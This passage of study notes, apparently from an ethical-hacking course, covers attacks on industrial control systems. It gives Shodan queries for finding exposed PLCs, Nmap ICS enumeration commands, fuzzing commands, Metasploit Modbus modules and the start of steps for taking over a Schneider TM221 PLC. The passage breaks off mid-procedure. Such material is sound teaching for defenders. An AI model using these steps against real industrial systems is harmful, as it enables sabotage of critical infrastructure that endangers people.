				- Protocol Abuse: Due to compatibility issues, many OT systems still use outdated legacy protocols and interfaces such as Modbus and CAN bus. Attackers exploit these vulnerabilities to launch attacks. For instance, they may abuse the emergency stop (e-stop) mechanism, a safety feature used to shut down machinery in emergencies, to execute single-packet attacks.
				- Potential Destruction of ICS Resources: Exploiting vulnerabilities in OT systems allows attackers to disrupt or degrade OT infrastructure functionality, leading to life- and safety-critical issues.
				- Reconnaissance Attacks: OT systems often permit remote communication with little or no encryption or authentication. Attackers can conduct reconnaissance and scanning operations to gather intelligence for later attack stages.
				- Denial-of-Service (DoS) Attacks: Attackers exploit communication protocols such as the Common Industrial Protocol (CIP) to perform DoS attacks on OT systems. For example, an attacker may send a malicious CIP connection request to a target device. Once the connection is established, they may send a fake IP configuration; if accepted, this can disrupt communication between the device and other connected systems.
				- HMI-Based Attacks: Human–Machine Interfaces (HMIs) are often referred to as Hacker–Machine Interfaces due to security vulnerabilities. Despite OT advancements, human interaction remains necessary, and vulnerabilities in HMI software—such as memory corruption, code injection, and privilege escalation—pose security risks.
				- Exploiting Enterprise-Specific Systems and Tools: Attackers may target ICS devices, such as Safety Instrumented Systems (SIS), by injecting malware through exploited protocols. This enables them to detect hardware and communication systems, disrupting or damaging services.
				- Spear Phishing: Attackers send fraudulent emails with malicious links or attachments that appear to come from legitimate sources. If a victim clicks the link or downloads the attachment, malware is installed, damaging resources and spreading across systems. For instance, if an attacker compromises a system maintaining sales software for an operational plant, the malware can propagate through the network and ultimately impact industrial automation components.
				- Malware Attacks: Attackers repurpose legacy malware originally designed for IT systems to exploit vulnerabilities in OT systems. They conduct reconnaissance to identify weak points in newly connected OT infrastructure and use older malware versions to launch attacks. In some cases, attackers develop malware specifically targeting OT systems, such as ICS/SCADA.
				- Exploiting Unpatched Vulnerabilities: Many ICS products, firmware, and software lack built-in security features. Additionally, ICS vendors cannot patch vulnerabilities as quickly as IT vendors. As a result, attackers exploit these unpatched vulnerabilities to launch cyberattacks on OT networks.
				- Side-Channel Attacks: Attackers retrieve sensitive information by analyzing an OT system’s physical characteristics. Techniques such as timing and power analysis allow them to conduct side-channel attacks.
				- Buffer Overflow Attacks: Cybercriminals exploit buffer overflow vulnerabilities in ICS software, including HMI web interfaces, ICS web clients, and communication interfaces. By injecting malicious data and commands, they can alter system behavior and disrupt operations.
				- Exploiting RF Remote Controllers: OT networks use RF technology for remote industrial operations, but many RF communication protocols lack built-in security. Attackers can exploit these vulnerabilities to sabotage production, manipulate system controls, and gain unauthorized access.
		- HMI-Based Attacks:
			- Attackers often target HMI (Human-Machine Interface) systems, as they serve as central hubs for controlling critical infrastructure. If attackers gain access to an HMI system, they can cause physical damage to SCADA devices or collect sensitive information about critical infrastructure, which can later be used for malicious activities. By leveraging this access, attackers can also disable alert notifications for incoming threats to SCADA systems.
			- Below are various SCADA vulnerabilities that attackers exploit to carry out HMI-based attacks on industrial control systems:
				- Memory Corruption: This category includes code security issues such as out-of-bounds read/write vulnerabilities and heap- or stack-based buffer overflows. In an HMI system, memory corruption occurs when memory contents are altered due to errors in the code. If these corrupted memory contents are used, the program may crash or execute unintended operations. Attackers can exploit this vulnerability by overwriting code to trigger a buffer overflow. Additionally, an unflushed stack can allow attackers to manipulate strings to exploit the program.
				- Credential Management: Vulnerabilities in this category include the use of hardcoded passwords, storing credentials in insecure formats such as plaintext, and weak credential protection mechanisms. Attackers can exploit these weaknesses to gain administrative access to the system, modify system databases, or alter critical settings.
				- Lack of Authorization/Authentication and Insecure Defaults: This category includes vulnerabilities such as the transmission of confidential information in plaintext, insecure default configurations, missing encryption, and insecure ActiveX controls used for scripting. In some SCADA solutions, administrators can view the passwords of other users. Attackers can exploit these vulnerabilities to gain unauthorized access to the system, allowing them to record or manipulate transmitted or stored information.
				- Code Injection: This category includes common code injection vulnerabilities, such as SQL, OS command, and other domain-specific injections. One example is Gamma, a domain-specific scripting language for HMIs, which is susceptible to code injection attacks. Gamma is designed for rapid UI and control application development. However, an EvalExpression vulnerability in Gamma allows attackers to execute arbitrary scripts or commands on the target SCADA system.
				- Buffer Overflow Vulnerabilities: Some HMI software is vulnerable to buffer overflow attacks, where excessive input data overflows the allocated buffer, potentially allowing attackers to execute arbitrary code on the system.
				- Path Traversal: Path traversal vulnerabilities in HMI web servers allow attackers to access directories and files outside the web root folder. This can lead to unauthorized information disclosure or data manipulation.
		- Side-Channel Attacks:
			- Attackers execute side-channel attacks by monitoring the physical implementation of a target system to obtain critical information. Two primary techniques used for these attacks are timing analysis and power analysis, both of which can compromise OT (Operational Technology) systems.
				- Timing Analysis: This attack exploits variations in the time taken by a device to execute different computations.
				- Power Analysis: This attack monitors changes in power consumption during cryptographic operations.
			- ICS (Industrial Control Systems) are particularly vulnerable to these side-channel attacks.
			- Timing Analysis:
				- Passwords are often transmitted through a serial channel. Attackers use a looping strategy to recover these passwords by checking one character at a time. If the first character entered is correct, the loop continues for subsequent characters; otherwise, it terminates. By measuring the time taken to complete the password authentication process, attackers can determine how many characters are correct. Fortunately, timing-based attacks are relatively easy to detect and mitigate.
			- Power Analysis:
				- Power-analysis attacks are more challenging to detect because the affected device can continue operating even after being compromised. For this reason, attackers often prefer power analysis over timing-based methods to extract sensitive information.
				- This attack is carried out by observing changes in power consumption during semiconductor clock cycles. An oscilloscope detects the time intervals between pulses using a probe, generating a power profile that reveals clues about how data is processed.
				- For example, by analyzing the power profile, attackers can determine when a correct character in a password is compared to an incorrect one. The same method can also be used to extract cryptographic keys. Attackers with physical access to an unprotected or unsupervised device can use an oscilloscope and specialized hardware running analysis software to retrieve cryptographic keys.
			- Once attackers obtain these keys, they can modify the configurations of the targeted devices. Since these systems are commonly used to safeguard power grids, unauthorized configuration changes can have devastating consequences. Attackers may disrupt system operations or manipulate data transmitted to the operator. Because these devices are often managed by a centralized system, incorrect data from a single compromised device can significantly impact the entire OT network.
		- Hacking Programmable Logic Controllers (PLCs):
			- PLCs are vulnerable to cyber-attacks, as they control the physical processes of critical infrastructure. Attackers identify Internet-exposed PLCs using online tools such as Shodan. A compromised PLC poses a serious security threat to organizations, as attackers can manipulate its integrity and availability by exploiting pin control operations. This can lead to attacks such as payload sabotage and PLC rootkits.
			- PLC Rootkit Attack
				- Steps of PLC Rootkit Attack:
					- Gaining Access: The attacker injects a rootkit into the PLC device and performs a control-flow attack against the PLC runtime to guess the default password, ultimately gaining root-level access.
					- Mapping & Overwriting: The attacker maps the input and output (I/O) modules and their memory locations to overwrite PLC parameters.
					- Manipulating I/O Operations: After understanding the I/O pins and PLC logic mapping, the attacker alters the I/O initialization sequence, gaining full control over PLC operations.
				- A PLC rootkit exploits architectural flaws in microprocessors to bypass modern detection mechanisms. By manipulating the I/O initialization, the attacker gains full control over the PLC’s input and output processing. This type of attack is also known as a PLC ghost attack and requires an in-depth understanding of PLC architecture.
				- A PLC's CPU operates in two modes:
					- Programming Mode: Allows remote downloading of code from any computer.
					- Run Mode: Executes the actual code.
			- Once an attacker gains access, they can download malicious code to the PLC, replacing the original program. The infected PLC then executes the attacker's code, enabling full manipulation of input and output processes. This control allows the attacker to disrupt, damage, or even destroy mechanical operations.
		- Evil PLC Attack:
			- In an Evil PLC attack, an attacker attempts to identify vulnerable or Internet-exposed PLC devices using online resources to target OT workstations and disrupt the production environment. Devices exposed to the Internet often lack adequate security measures, making them susceptible to unauthorized access and intermediary data modifications. If a vulnerable PLC is found, the attacker turns it into an Evil PLC by modifying its configuration settings and altering its behavior and logic through download procedures.
			- The following are the steps involved in an Evil PLC attack:
				- Step 1: The attacker identifies a vulnerable PLC using tools like Shodan or Censys.
				- Step 2: The attacker exploits the PLC’s firmware and weaponizes it by modifying its programming logic through download procedures.
				- Step 3: Using the compromised PLC, the attacker initiates upload procedures on connected workstations to execute arbitrary code.
		- Hacking Industrial Systems Through RF Remote Controllers:
			- Many industrial machines are operated via remote controllers, which are widely used in industries such as manufacturing, logistics, mining, and construction for automation and machine control. These devices communicate within a network using a transmitter (TX) and a receiver (RX). The transmitter (TX) sends radio commands (via buttons), while the receiver (RX) responds accordingly. However, inadequate security measures in devices operated via remote controllers can pose serious threats to industrial systems.
			- Attackers within the system’s operational range can exploit vulnerabilities using specially designed radio transceiver devices. These devices allow attackers to craft and transmit their own packets within the network, enabling unauthorized access to the industrial system and facilitating malicious activities.
			- Below are some common threats industrial systems face through RF remote controllers:
				- Replay Attack: Attackers capture and replay recorded RF packets transmitted by an operator to gain unauthorized control over the system.
				- Command Injection: By analyzing RF protocols, attackers can modify existing RF packets or inject their own using reverse engineering techniques. They can record commands, decipher additional control functions, and send manipulated commands to disrupt or take full control of the target machine.
				- Abusing E-stop: Using the gathered RF command data, attackers can repeatedly send emergency stop (E-stop) signals to the target device, causing a denial-of-service (DoS) attack that disrupts operations.
				- Re-pairing with a Malicious RF Controller: An attacker can hijack the original remote controller and re-pair the machine with a malicious RF controller disguised as a legitimate one. By capturing the pairing sequence, they can take control of the target device and execute various attacks.
				- Malicious Reprogramming Attack: Attackers can inject malware into the firmware of remote controllers, maintaining persistent and unauthorized access to the target industrial system.
		- OT Supply Chain Attacks:
			- Operational Technology (OT) supply chain attacks involve compromising the hardware, software, or services of an organization's suppliers to infiltrate its OT environment. These attacks can be particularly devastating as they often exploit trusted relationships and may go undetected for extended periods.
			- Below are key techniques attackers use to conduct supply chain attacks in OT environments:
				- Third-Party Software Compromise: Attackers inject malicious code into trusted software updates, creating backdoors or embedding malicious functionalities upon installation.
				- Hardware Manipulation: Attackers modify hardware components during manufacturing or distribution, embedding malicious firmware or chips that activate once deployed in the target environment.
				- Service Provider Breach: Attackers compromise service providers—such as maintenance or support contractors—to infiltrate the target organization's OT network using stolen credentials, remote access tools, or insider access.
				- Injection of Malicious Components: Attackers introduce malicious components or firmware into the supply chain by tampering during shipping or replacing legitimate parts with compromised ones.
				- Exploitation of Trusted Relationships: Attackers leverage the trust and access granted to suppliers, subcontractors, or partners to move laterally within the target organization’s network.
		- OT Malware:
			- Attackers are developing sophisticated malware to target industrial systems. Recently, OT malware such as Stuxnet and Industroyer.V2 have caused severe disruptions to business processes on industrial networks. Such malware can inflict damage on both software and hardware used to operate critical infrastructure. In some scenarios, OT malware can also propagate infections, rendering connected devices inoperable.
			- Industrial control systems (ICS) are particularly susceptible to malware attacks due to their connectivity to broader networks. Additionally, OT solutions often rely on proprietary systems and legacy technology that are not regularly updated or patched, making them more vulnerable to cyber threats. Once an industrial system is infected, OT ransomware can destructively lock and encrypt hard drive files, rendering the system inaccessible and unusable.
			- Notable Examples of OT Malware:
				- Stuxnet (claroty.com):
					- Stuxnet is a destructive industrial control system (ICS) malware specifically developed to disrupt OT environments. These environments are responsible for monitoring safety systems and other critical infrastructures. Attackers can use malware to manipulate crucial data, block access to sensor gateways, and attempt to damage physical sensors within OT environments.
					- Once deployed, Stuxnet can compromise gateways by rewriting the NAND chip, effectively disabling remote access and preventing administrators from regaining control. Additionally, the malware can exploit weak credentials on OT devices to gain root access to targeted sensor gateways, further compromising the system. To maximize disruption, attackers can use fuzzing techniques—such as sending malformed packets to sensors—causing them to malfunction. This can result in inaccurate sensor readings and potentially lead to physical damage to equipment.
				- Kapeka
				- Abyss Locker
				- AvosLocker
				- COSMICENERGY
				- INDUSTROYER.V2
				- Pipedream
		- OT Malware Analysis: COSMICENERGY (cloud.google.com):
			- COSMICENERGY is a novel operational technology (OT) and industrial control system (ICS)-oriented malware designed to disrupt power systems by interacting with IEC 60870-5-104 (IEC-104) devices, such as remote terminal units (RTUs). It shares similarities with previous malware like INDUSTROYER and INDUSTROYER.V2, which are known for disrupting power grids through the IEC-104 protocol.
			- COSMICENERGY Attack Scenario:
				- Stage 1: Reconnaissance:
					- Attackers begin by conducting reconnaissance to identify potential targets and gather information about the target environment. This includes:
						- Identifying MSSQL servers with access to the OT network.
						- Extracting MSSQL credentials.
						- Locating target IEC-104 device IP addresses.
						- Gathering details on targeted assets, such as power-line switches, circuit breakers in an RTU, or relay configurations.
				- Stage 2: Initial Access:
					- Attackers gain access to the target environment, potentially by exploiting vulnerabilities or using stolen credentials. In COSMICENERGY’s case, this may involve connecting to a user-supplied remote MSSQL server. Once access is established, COSMICENERGY uploads and executes malicious files on the target system.
				- Stage 3: Executing the Attack:
					- Once inside the target environment, attackers deploy and execute COSMICENERGY, which consists of two main components: PIEHOP and LIGHTWORK.
					- PIEHOP (Python-based):
						- Connects to the MSSQL server to upload files.
						- Issues remote commands to the RTU.
						- The main entry point, r3_iec104_control.py, calls PIEHOP’s main function with the argument control=True.
						- The script imports the "iec104_mssql_lib" module to facilitate communication.
					- LIGHTWORK (C++-based):
						- Executes IEC-104 ASDU messages to manipulate RTU information object addresses (IOAs).
						- Alters the state of power-line switches and circuit breakers (turning them ON or OFF).
						- Command-line usage: OT_T855_IEC104_GR.exe <ip_address> <port> <command> [ON (1) / OFF (0)]
					- LIGHTWORK follows this sequence of actions:
						- Sends a C_IC_NA_1 (station interrogation command) to retrieve the target station’s status.
						- Executes C_SC_NA_1 (single command) for each hardcoded IOA to change its state.
						- Issues C_CS_NA_1 (clock synchronization command) to align the target station’s clock with the attacker's device.
					- If executed successfully, LIGHTWORK provides command-line output confirming the changes.
					- By leveraging these two components, COSMICENERGY can cause power disruptions by repeatedly sending ON/OFF commands to IEC-104 devices. This could lead to widespread outages and potential damage to the power grid.
				- Stage 4: Lateral Movement & Covering Tracks:
					- COSMICENERGY does not have built-in lateral movement capabilities. However, attackers conduct internal reconnaissance, suggesting they may move laterally within the network to gather necessary information before executing the attack.
			- After achieving their objectives, attackers attempt to erase traces of their activity by deleting PIEHOP, LIGHTWORK, and other malicious files from compromised systems.
	- OT Hacking Methodology:
		- Operational Technology (OT) systems, such as Industrial Control Systems (ICS), Supervisory Control and Data Acquisition (SCADA), and Distributed Control Systems (DCS), are commonly used to monitor and control physical industrial processes. These systems collect data from various sources, including temperature sensors, pressure monitors, and valve positions, and they control actuators such as electrical, hydraulic, mechanical, and pneumatic devices.
		- In the past, OT systems were completely isolated from the internet. However, due to increasing interoperability requirements and business demands, OT and IT networks have become interconnected. This convergence has introduced significant security vulnerabilities, allowing cybercriminals to exploit IT network weaknesses to launch disruptive attacks on OT systems. This section discusses OT hacking methodologies and how cyberattacks can be conducted using various automated tools.
		- What is OT Hacking:
			- Today, industrial systems are more connected to the internet than ever before, making them increasingly vulnerable to cyber threats. Attackers are executing sophisticated and targeted cyberattacks that can cause physical damage to industrial systems. Many organizations still use legacy software to maintain compatibility and often share sensitive information with third parties for remote equipment maintenance. These factors create severe security risks.
			- The primary objective of OT hacking is to damage or disrupt business processes by compromising industrial control systems across manufacturing sites. Due to the integration of IT and OT, OT systems face numerous threats, including attacks through remote sensors, Wi-Fi-enabled controllers, USB devices used for software and firmware upgrades, and cloud services (e.g., SCADA-as-a-Service). This increased exposure makes OT systems an attractive target for hackers.
		- How Can a Hacker Profit from a Compromised OT System:
			- A hacker who successfully infiltrates an OT system can:
			- Take full control of the system, damage equipment, or steal critical business and operational data.
			- Shut down an entire plant or disrupt production by launching Distributed Denial-of-Service (DDoS) attacks, causing financial and reputational damage.
			- Reprogram assembly processes to bypass critical production steps, leading to defective products.
			- Manipulate industrial machinery to create hazardous conditions, potentially injuring employees through overheating or emergency shutdowns.
			- Deploy malware to disrupt critical infrastructure operations.
			- Install ransomware to block access to OT systems and demand a ransom for restoration.
		- OT Hacking Methodology:
			- Hacking an OT network typically involves the following phases:
				- Information Gathering – Collecting intelligence on the target OT system, including network architecture, communication protocols, and device configurations.
				- Vulnerability Scanning – Identifying security weaknesses in OT components, including outdated software, misconfigurations, and unsecured access points.
				- Launching Attacks – Exploiting vulnerabilities to gain unauthorized access or disrupt OT operations.
				- Gaining Remote Access – Establishing persistent access to compromised OT systems to maintain control over industrial processes.
				- Maintaining Access – Using techniques such as backdoors and privilege escalation to ensure continued access while evading detection.
		- Information Gathering:
			- The first step in hacking an OT network is gathering information about the target OT network and its systems using various footprinting and reconnaissance techniques. These techniques allow attackers to enumerate the network, identify connected devices, determine their geolocation, obtain default passwords, detect open ports, and analyze running services. Tools such as Shodan and Nmap are commonly used to collect this information.
			- Identifying ICS/SCADA Systems Using Shodan (www.shodan.io):
				- Shodan is a search engine that helps attackers gather information about OT devices connected to the Internet. This tool can be used to obtain details about SCADA systems deployed in water treatment plants, nuclear power plants, HVAC systems, electrical transmission grids, home heating systems, and more.
				- Identifying SCADA Systems Using Port Numbers:
					- ICS/SCADA systems use various protocols unique to PLC manufacturers. Some key SCADA protocols include:
						- Modbus (port 502)
						- Fieldbus (ports 1089-1091)
						- DNP (port 19999)
						- Ethernet/IP (port 2222)
						- DNP3 (port 20000)
						- PROFINET (ports 34962-34964)
						- EtherCAT (port 34980)
					- By identifying these ports, attackers can locate vulnerable SCADA systems connected to the Internet.
					- Example search query to find Modbus-enabled ICS/SCADA systems: port:502 (Retrieves all ICS/SCADA systems with Modbus port 502 enabled)
				- Discovering SCADA Systems Using PLC Names:
					- Attackers can also identify SCADA systems by searching for version numbers, PLC names, or manufacturer names. Shodan allows attackers to search system banners displaying details such as PLC name, manufacturer, and software versions.
					- For instance, Schneider Electric is a company that deploys various Modbus-based ICS systems. An attacker can use Shodan to find all systems referencing Schneider Electric in their banners.
					- Example search query: "Schneider Electric" (Displays all systems using Schneider Electric products)
				- Searching for SCADA Systems Based on Geolocation:
					- Attackers can filter SCADA system searches by country to target specific regions.
					- Example search query: SCADA Country:"US" (Displays all SCADA systems located in the United States)
			- Gathering Default Passwords Using CIRT.net (www.cirt.net):
				- CIRT.net’s default password database is an online repository that stores default passwords for various devices, including those used in critical infrastructure. Attackers can exploit this database to obtain default credentials for a wide range of devices, such as routers, switches, and industrial control systems (ICS).
			- Information-Gathering Tools:
				- Below are various OT information-gathering tools:
				- Kamerka-GUI (github.com): Kamerka-GUI is an OT reconnaissance tool designed to locate and map Internet-facing industrial control systems (ICS). It leverages Shodan’s advanced search filters to identify specific ICS devices, such as SCADA systems, PLCs, HMIs, and RTUs. Attackers can use Kamerka-GUI to pinpoint country-specific vulnerable ICS devices. Additionally, the tool provides an interactive map displaying the locations of identified ICS devices, offering a clear visual representation of their distribution. It can also generate heat maps to highlight regions with high concentrations of vulnerable devices.
				- SearchDiggity (bishopfox.com)
				- Zeek (zeek.org)
				- Criminal IP (www.criminalip.io)
				- ZoomEye (www.zoomeye.hk)
				- ONYPHE (www.onyphe.io)
			- Scanning ICS/SCADA Systems Using Nmap:
				- Attackers use scanning tools such as Nmap to identify open ports and running services on systems connected to OT networks.
				- Below are various Nmap commands used by attackers to enumerate open ports and services on ICS/SCADA systems:
					- Identifying Open Ports and Services:
						- nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p 80,102,443,502,530,593,789,1089-1091,1911,1962,2222,2404,4000,4840,4843,4911,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824,55000-55003 <Target IP>
						- Attackers use this Nmap command for initial reconnaissance to identify active ICS/SCADA protocols. The listed ports are well-known for ICS/SCADA communication.
					- Identifying HMI Systems:
						- nmap -Pn -sT -p 46824 <Target IP>
						- Some vendors provide HMI interfaces that operate on non-standard ICS/SCADA ports. For example, Sielco Sistemi Winlog HMI software uses TCP port 46824.
					- Scanning Siemens SIMATIC S7 PLCs:
						- nmap -Pn -sT -p 102 --script=s7-info <Target IP>
						- This command helps attackers detect PLC devices with open port 102, which Siemens SIMATIC S7 PLCs use for S7 Communication—facilitating data exchange between PLCs and SCADA systems.
					- Scanning Modbus Devices:
						- nmap -Pn -sT -p 502 --script modbus-discover <Target IP>
						- nmap -Pn -sT -p 502 --script modbus-discover --script-args='modbus-discover.aggressive=true' <Target IP>
						- These commands identify Modbus-enabled devices and retrieve their Slave IDs.
					- Scanning BACnet Devices:
						- nmap -Pn -sU -p 47808 --script bacnet-info <Target IP>
						- Attackers use this command to enumerate BACnet devices used in building automation, HVAC, and industrial control systems. It reveals information such as vendor name, device name, serial number, firmware version, and BACnet Broadcast Management Devices (BBMDs).
					- Scanning Ethernet/IP Devices:
						- nmap -Pn -sU -p 44818 --script enip-info <Target IP>
						- Ethernet/IP is widely used in industrial networks. It operates on UDP port 44818, using the CIP protocol for industrial communication. This command gathers details such as vendor name, product code, device name, and IP address.
					- Scanning Niagara Fox Devices:
						- nmap -Pn -sT -p 1911,4911 --script fox-info <Target IP>
						- Niagara Fox is a protocol for device-to-device communication in building management systems (BMSs). It operates on TCP ports 1911 and 4911. Attackers use this command to collect details like application name, Java version, host OS, time zone, local IP, and software versions.
					- Scanning ProConOS Devices:
						- nmap -Pn -sT -p 20547 --script proconos-info <Target IP>
						- ProConOS is a runtime engine for PLC devices. This command reveals information such as PLC type, project name, source code name, and ladder logic runtime details.
					- Scanning Omron PLC Devices:
						- nmap -Pn -sT -p 9600 --script omron-info <Target IP>
						- nmap -Pn -sU -p 9600 --script omron-info <Target IP>
						- Omron's Factory Interface Network Service (FINS) protocol allows PLCs to exchange program data. It operates on TCP/UDP port 9600.
					- Scanning PCWorx Devices:
						- nmap -Pn -sT -p 1962 --script pcworx-info <Target IP>
						- PCWorx systems process unauthenticated messages from remote systems. Attackers use this command to extract PLC type, model number, and firmware version.
			- Sniffing Using NetworkMiner (www.netresec.com):
				- NetworkMiner is a passive network sniffing and packet capture tool used to detect open ports, hostnames, operating systems, sessions, and other network information without generating traffic. It is also commonly used for parsing and analyzing PCAP files, as well as reassembling or extracting transmitted files and certificates. With NetworkMiner, users can analyze previously captured network traffic from an ICS network by examining PCAP files.
			- Analyzing Modbus/TCP Traffic Using Wireshark (www.wireshark.org):
				- Wireshark is an open-source network protocol analyzer used for capturing and analyzing network traffic. It can be employed to monitor Modbus/TCP traffic on industrial networks. Since Modbus/TCP lacks built-in encryption or security features, attackers can intercept and analyze data packets transmitted between a network and a Modbus device. By manipulating captured packets, they may inject malicious payloads to compromise the system.
			- Discovering ICS/SCADA Network Protocols Using Malcolm (cisagov.github.io):
				- Malcolm is a powerful network traffic analysis tool designed to provide visibility into the protocols used in industrial control system (ICS) environments. It offers detailed insights into network communications through two intuitive interfaces:
					- OpenSearch Dashboard – A flexible data visualization plugin with multiple prebuilt dashboards that provide an easy overview of network protocols.
					- Arkime – A robust tool for analyzing and identifying network sessions, helping detect potential security incidents.
				- Additionally, Malcolm supports secure communication, enabling encrypted interactions between the user interface and remote log forwarders using standard encryption protocols.
		- Vulnerability Scanning:
			- Once attackers gather information about a target OT (Operational Technology) network and its systems, they conduct vulnerability scanning to identify exploitable weaknesses in critical infrastructure. They use tools such as SCADA plugins for Nessus and Skybox Vulnerability Control to detect vulnerabilities in OT and IT devices, protocols, and applications, including ICS/SCADA systems, PLCs, RTUs, HMIs, gateways, desktop computers, and other networked systems. Additionally, attackers leverage tools like Wireshark to monitor and analyze industrial network traffic, identifying potential vulnerabilities.
			- Vulnerability Scanning Using Nessus (www.tenable.com):
				- Nessus is a vulnerability assessment tool used to detect security flaws in ICS and SCADA systems. It provides attackers with an overview of vulnerabilities based on default policies and templates, while also allowing them to create custom scanning policies. Attackers use Nessus to identify, categorize, and exploit vulnerabilities within target OT networks. Nessus includes a collection of SCADA plugins that enable vulnerability scanning on ICS/SCADA devices. These vulnerabilities are detected based on plugin signatures.
				- Steps to Perform Vulnerability Scanning on ICS/SCADA Systems Using Nessus:
					- Log in to the Nessus web client using the credentials provided during installation.
					- Click on the Policies tab and select Create New Policy. Then, choose the Basic Network Scan template.
					- In the DISCOVERY section, modify the settings for port scanning and specify a port range of 0–1000.
					- Under the Plugins tab, verify whether SCADA plugins are available. If they are missing, the scan will only return results for non-SCADA ports.
					- Save the policy, then navigate to My Scans and select New Scan.
					- Under User Defined Policy, choose the policy created in Step 2.
					- Enter the required information, including the target IP address, and click Launch.
				- Once the scan is complete, Nessus displays the discovered vulnerabilities. In the example screenshot below, two SCADA-related vulnerabilities are marked in yellow.
				- After identifying system vulnerabilities, attackers employ various techniques to exploit them and launch further attacks on the target OT systems.
			- Vulnerability Scanning Using Skybox Vulnerability Control (www.skyboxsecurity.com):
				- Skybox conducts detailed path analysis across combined OT and IT networks, providing insights into associated vulnerabilities and related attack vectors. It integrates SCADA and ICS data with information gathered from attack vector analysis, Skybox intelligence feeds, SIEMs, threat intelligence feeds, and more. This tool can prioritize millions of vulnerabilities in OT/IT networks based on their risk levels. However, attackers could potentially analyze and group vulnerabilities across networks using Skybox to launch various attacks on IT/OT environments.
			- Sniffing and Vulnerability Scanning Tools:
				- Sniffing Tool: SmartRF Packet Sniffer (www.ti.com):
					- SmartRF Packet Sniffer includes software and firmware designed to capture and display over-the-air packets. The capture device connects to a PC via USB and supports the CC13xx and CC26xx family of devices. Additionally, it integrates with Wireshark for packet display and filtering. Supported protocols include ZigBee, EasyLink, and BLE.
				- Vulnerability Scanning Tool: Microsoft Defender for IoT (www.microsoft.com):
					- Microsoft Defender for IoT performs vulnerability assessments on IoT and ICS environments, providing an objective risk score. It identifies all IoT and ICS assets connected to a target network and detects device-level vulnerabilities such as missing patches, weak passwords, unused open ports, and remote access ports. Additionally, it reports network-level vulnerabilities, including unauthorized internet connections, weak firewall rules, rogue subnet connections between IT, IoT, and ICS, unauthorized Wireless Access Points (WAPs), and rogue devices.
			- Fuzzing ICS Protocols:
				- Fuzzing ICS (Industrial Control System) protocols such as Modbus, BACnet, and the Internet Printing Protocol (IPP) is essential for identifying vulnerabilities and analyzing critical network activities. Security researchers and attackers use tools like Fuzzowski to test industrial networks for potential errors and exploitable weaknesses.
				- Fuzzowski (github.com):
					- Fuzzowski is a network protocol fuzzer designed to perform fuzz testing on ICS protocols. It assists users in configuring communications and executing fuzz tests. Before fuzzing a protocol, it is crucial to have a thorough understanding of its structure and behavior.
					- Below are examples of fuzzing ICS protocols such as BACnet, Modbus, and IPP using Fuzzowski:
						- Fuzzing the BACnet Protocol: python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -m BACnetMon
						- Fuzzing Modbus: python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 1 -m modbusMon
						- Fuzzing IPP: python -m fuzzowski printer1 631 -f ipp -r get_printer_attribs --restart smartplug
		- Launch Attacks:
			- During the vulnerability scanning phase, attackers identify security weaknesses in the target industrial network and systems. Once discovered, these vulnerabilities are exploited to launch various attacks, including HMI-based attacks, side-channel attacks, PLC exploitation, replay attacks, and command injection attacks. Attackers often use tools such as Metasploit and modbus-cli to hack PLC devices via the Modbus protocol.
			- Hacking ICS Hardware:
				Attackers leverage publicly available online sources to gather details about the hardware chips used in specific ICS devices. These details include pin configurations, input/output (I/O) types, and connection interfaces. They can also analyze the integrated software within a chip to extract critical information such as certificates, key generation algorithms, and encryption functions.
				- Using this knowledge, attackers can manipulate analog and digital I/Os, modify device operations, and reset or reboot processes. By performing static and dynamic analysis of chip functions, they can identify vulnerabilities, such as buffer overflows and weak I/O validation, which manufacturers often overlook. Exploiting these vulnerabilities with specialized software and hardware tools allows attackers to compromise ICS hardware.
				- Common Tools Used to Attack ICS Hardware:
					- Hardware Tools:
						- Signal Analyzer: Used to test and analyze the binary operation of specific chip pins.
						- Multimeter: Functions similarly to a signal analyzer for measuring voltage and performing basic tests.
						- Microcontrollers & Memory Programmers: Help in understanding and programming various chip types, including flash memory and EPROMs.
						- Oscilloscope: Interprets and visualizes analog or digital signals with high accuracy.
						- Soldering Equipment: Used for attaching and detaching hardware components like chips and memory modules for isolated examination.
						- Digital Microscope or Magnifying Glass: Enhances precision in soldering and helps read small text or visualize tiny components.
						- Communication Interface (e.g., JTAG): Enables direct communication with ICS devices.
						- Screwdrivers & Precision Screwdrivers: Used to disassemble devices for internal analysis.
						- Precision Tweezers & Converters: Assist in connecting and capturing data from communication buses, such as UART converters or serial-to-USB adapters.
					- Software Tools:
						- GDB (www.sourceware.org): A debugging tool for Linux that helps attackers understand on-chip execution processes.
						- OpenOCD (openocd.org): Connects a system to the chip under examination via GDB (port 3333) or a Telnet interface (port 4444/TCP).
						- Binwalk (github.com): Scans and analyzes firmware binaries, revealing encryption types, partitions, and filesystems.
						- Fritzing (fritzing.org): Assists in designing electronic circuits and diagrams.
						- Radare2 (github.com): A portable framework for reverse engineering and binary analysis.
						- Ghidra (github.com): A software reverse engineering (SRE) framework that supports disassembly, decompilation, graphing, and scripting across multiple platforms.
						- IDA Pro (hex-rays.com): A disassembler that converts machine-executable code into human-readable assembly language.
			- Hacking Modbus Slaves Using Metasploit:
				- Modbus Masters and Slaves communicate in plaintext without authentication. Attackers can exploit this vulnerability by generating and sending forged query packets to Modbus Slaves, allowing them to access and manipulate registers and coils. This attack is possible only if the attacker's machine can send packets to the Modbus Slave using the Modbus protocol format. Hackers often use tools like Metasploit to perform various attacks on Modbus Slaves.
				- Scanning Modbus Slaves:
					- Attackers use the auxiliary/scanner/scada/modbus_findunitid Metasploit module to scan and detect Modbus Slaves connected to the target network LAN or within a Modbus gateway.
				- Manipulating Modbus Slave Data:
					- Attackers use the auxiliary/scanner/scada/modbusclient Metasploit module to read or write registers and coils on the target Modbus Slave.
			- Hacking PLCs Using modbus-cli:
				- Programmable Logic Controllers (PLCs) are used to control industrial infrastructure such as manufacturing facilities, wastewater treatment plants, electrical grids, and petroleum refineries. Attackers often target PLC devices, such as the Schneider Electric TM221, which automate processes in various industries. These devices communicate using the Modbus/TCP protocol, making them vulnerable to exploitation through tools like modbus-cli.
				- Steps to Hack a PLC Using modbus-cli (github.com):
					- Step 1: Identify Internet-Connected PLCs:
						- Tools like Shodan and Nmap can be used to find exposed industrial systems on the Internet. To detect Schneider Electric TM221 PLCs online, enter TM221ME16R in the Shodan search bar. Shodan will retrieve all Schneider Electric TM221 PLCs connected to the Internet, many of which may have security vulnerabilities.
					- Step 2: Install modbus-cli:
